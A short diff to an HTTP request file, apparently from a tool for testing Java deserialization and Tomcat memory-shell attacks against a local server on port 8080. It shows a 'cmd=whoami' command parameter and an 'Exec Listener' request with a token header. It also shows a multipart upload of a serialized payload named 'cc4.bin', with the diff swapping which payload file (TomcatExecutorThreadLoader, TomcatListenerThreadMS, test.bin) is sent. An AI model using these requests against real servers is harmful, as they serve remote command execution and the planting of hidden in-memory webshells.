@@ -13,7 +13,7 @@ cmd=whoami
 # Exec Listener
 POST /base64 HTTP/1.1
 Host: 127.0.0.1:8080
-Xoken: hostname
+X-Token: hostname
 Content-Type: application/x-www-form-urlencoded
 
 
@@ -31,8 +31,8 @@ Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0g
 Content-Disposition: form-data; name="file"; filename="cc4.bin"
 Content-Type: application/octet-stream
 
-#< ./dev/test.bin
-< ./dev/TomcatExecutorThreadLoader.bin
+< ./dev/test.bin
+#< ./dev/TomcatExecutorThreadLoader.bin
 #< ./dev/TomcatListenerThreadMS.bin
 ------WebKitFormBoundary7MA4YWxkTrZu0gW--
 
